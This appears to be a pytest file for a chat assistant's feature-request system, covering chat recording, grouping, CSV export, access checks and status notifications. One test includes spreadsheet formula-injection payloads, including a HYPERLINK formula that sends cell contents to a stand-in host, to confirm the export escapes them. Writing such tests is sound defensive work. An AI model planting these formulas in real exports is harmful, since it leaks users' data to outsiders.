"""Request a feature (spec 2026-10-22-teach-mia-design 4b, Q130: kept on the node)."""

import asyncio
import functools
from typing import Any

import pytest
from fastapi.testclient import TestClient
from sqlmodel import Session, col, select

from mia.api.main import app
from mia.channels.base import ChannelCapabilities
from mia.channels.render import ButtonsPart, to_parts
from mia.chat import features
from mia.chat.blocks import ChatReply
from mia.chat.service import run_turn
from mia.cli import main
from mia.core import jev, orgconfig, store
from mia.core.models import Actor, Event, Message, Person
from mia.i18n import t
from mia.settings import get_settings
from tests.jev_fake import answers_for, choice, fake_jev


@pytest.fixture
def sales_jev(monkeypatch: pytest.MonkeyPatch, ferinos: tuple[Any, dict[str, Person]]) -> None:
    """Ferino's with the sales supervisor only; its decider always asks to rephrase."""
    only = orgconfig.OrgSettings(agents=["sales_supervisor"])
    monkeypatch.setattr(orgconfig, "load", functools.cache(lambda org=None: only))
    monkeypatch.setenv("MIA_TYPESAFE_KEY", "k")
    monkeypatch.setenv("MIA_DECIDER", "jev")
    get_settings.cache_clear()

    def answer(body: dict[str, Any]) -> dict[str, Any]:
        if "agent" in body["questions"]:
            return {"agent": choice("sales_supervisor")}
        return answers_for(body, "clarify", 0.9, {"clarify": 0.9})

    monkeypatch.setattr(jev, "_inner", lambda: fake_jev(answer))


def _turn(session: Session, person: Person, text: str, thread: str | None = None) -> ChatReply:
    reply = asyncio.run(run_turn(session, None, person, text, thread))
    session.commit()
    return reply


def _requests(session: Session) -> list[dict[str, Any]]:
    rows = session.exec(select(Event).where(Event.action == features.REQUESTED)).all()
    return [e.after or {} for e in rows]


def test_a_request_prefix_is_recorded_before_routing(
    session: Session, ferinos: tuple[Any, dict[str, Person]], sales_jev: None
) -> None:
    ana = ferinos[1]["Ana"]
    reply = _turn(session, ana, "Request: print the receipts every night")
    assert reply.text() == t("feature.recorded", ana.language)
    (req,) = _requests(session)
    assert req["text"] == "print the receipts every night" and req["role"] == ana.roles[0]
    assert req["branch_id"] == ana.branch_id and req["language"] == ana.language
    assert features.prefixed("requested: x") is None and features.prefixed("request:  ") is None


def test_the_rephrase_offers_ask_for_this_feature_and_the_tap_records_the_message(
    session: Session, ferinos: tuple[Any, dict[str, Person]], sales_jev: None
) -> None:
    ana = ferinos[1]["Ana"]
    lang = ana.language
    asked = _turn(session, ana, "send the menu to my email")
    assert asked.text() == t("clarify.rephrase", lang)
    caps = ChannelCapabilities(
        max_text=4096,
        max_buttons=3,
        max_button_label=20,
        max_list_rows=10,
        max_list_label=24,
        session_window_hours=None,
        supports_templates=False,
    )
    (part,) = to_parts(asked.blocks, caps, lang)
    assert isinstance(part, ButtonsPart) and part.buttons == [t("feature.ask", lang)[:20]]
    reply = _turn(session, ana, t("feature.ask", lang), asked.thread_id)
    assert reply.text() == t("feature.recorded", lang)
    (req,) = _requests(session)
    failed = session.get(Message, req["failed_message_id"])
    assert failed is not None and failed.text == req["text"] == "send the menu to my email"


def test_ask_for_this_feature_without_a_rephrase_is_plain_text(
    session: Session, ferinos: tuple[Any, dict[str, Person]], sales_jev: None
) -> None:
    ana = ferinos[1]["Ana"]
    _turn(session, ana, t("feature.ask", ana.language))
    assert _requests(session) == []


def test_requests_group_by_key_and_a_status_change_tells_every_asker(
    session: Session, ferinos: tuple[Any, dict[str, Person]], capsys: pytest.CaptureFixture[str]
) -> None:
    staff = ferinos[1]
    ana, liza = staff["Ana"], staff["Liza"]
    first = features.request(session, ana, "Print receipts", Actor.person(ana))
    features.request(session, liza, "print receipts!", Actor.person(liza))
    features.request(session, liza, "dark mode", Actor.person(liza))
    session.commit()
    (top, other) = features.groups(session)
    assert (top.id, top.count, top.people, top.status) == (first.id, 2, [ana.id, liza.id], "new")
    assert other.count == 1
    assert main(["requests", "export"]) == 0
    lines = capsys.readouterr().out.splitlines()
    assert lines[0].startswith("id,key,text,count,status") and lines[1].startswith(f"{first.id},")
    assert ",2,new," in lines[1]
    assert main(["requests", "status", first.id, "planned"]) == 0
    session.expire_all()
    told = session.exec(
        select(Message).where(Message.role == "notification").order_by(col(Message.id))
    ).all()
    for person in (ana, liza):
        mine = [m.text for m in told if m.thread_id and _owner(session, m) == person.id]
        assert mine == [t("feature.status.planned", person.language, what="Print receipts")]
    assert features.groups(session)[0].status == "planned"
    with pytest.raises(SystemExit):
        main(["requests", "status", "nope", "built"])


def _owner(session: Session, m: Message) -> str:
    from mia.core.models import Thread

    thread = session.get(Thread, m.thread_id)
    assert thread is not None
    return thread.person_id


def test_the_app_route_checks_rbac(
    session: Session, ferinos: tuple[Any, dict[str, Person]]
) -> None:
    ana = ferinos[1]["Ana"]
    client = TestClient(app)
    res = client.post(
        "/feature-requests", json={"text": "dark mode"}, headers={"X-Mia-Actor": ana.id}
    )
    assert res.status_code == 200, res.text
    guest = store.insert(
        session,
        Person(branch_id=ana.branch_id, name="Guest", roles=["guest"], language="en"),
        Actor.system(ana.branch_id),
    )
    session.commit()
    res = client.post(
        "/feature-requests", json={"text": "dark mode"}, headers={"X-Mia-Actor": guest.id}
    )
    assert res.status_code == 403
    session.expire_all()
    assert len(_requests(session)) == 1
    denied = session.exec(select(Event).where(Event.action == "rbac.deny")).all()
    assert any((e.after or {})["resource"] == "data:feature_requests" for e in denied)


def test_the_export_never_hands_a_spreadsheet_a_formula(
    session: Session, ferinos: tuple[Any, dict[str, Person]]
) -> None:
    """H5: a cell that starts with =, +, -, @, tab or carriage return gets a quote; the
    stored text stays as typed."""
    import csv
    import io

    ana = ferinos[1]["Ana"]
    texts = ['=HYPERLINK("http://x/?"&A1,"open")', "+1 cmd", "-x", "@sum", "safe"]
    for text in texts:
        features.request(session, ana, text, Actor.person(ana))
    session.commit()
    rows = list(csv.reader(io.StringIO(features.export_csv(session))))[1:]
    assert {r[2] for r in rows} == {"'" + x for x in texts[:4]} | {"safe"}
    assert all(c[:1] not in ("=", "+", "-", "@", "\t", "\r") for r in rows for c in r)
    assert {r["text"] for r in _requests(session)} >= {texts[0], "safe"}


def test_the_chat_request_runs_the_same_rbac_check(
    session: Session, ferinos: tuple[Any, dict[str, Person]], sales_jev: None
) -> None:
    """M4: "request: ..." in chat checks data:feature_requests as POST /feature-requests."""
    ana = ferinos[1]["Ana"]
    guest = store.insert(
        session,
        Person(branch_id=ana.branch_id, name="Guest", roles=["guest"], language="en"),
        Actor.system(ana.branch_id),
    )
    session.commit()
    from mia.chat import service

    thread, message = service._store(session, guest, "request: dark mode", None)
    reply = asyncio.run(service.respond(session, guest, thread, message))
    session.commit()
    assert reply.text() == t("denied.generic", "en") and _requests(session) == []
    denied = session.exec(select(Event).where(Event.action == "rbac.deny")).all()
    assert any((e.after or {})["resource"] == "data:feature_requests" for e in denied)
    _turn(session, ana, "request: dark mode")
    assert len(_requests(session)) == 1
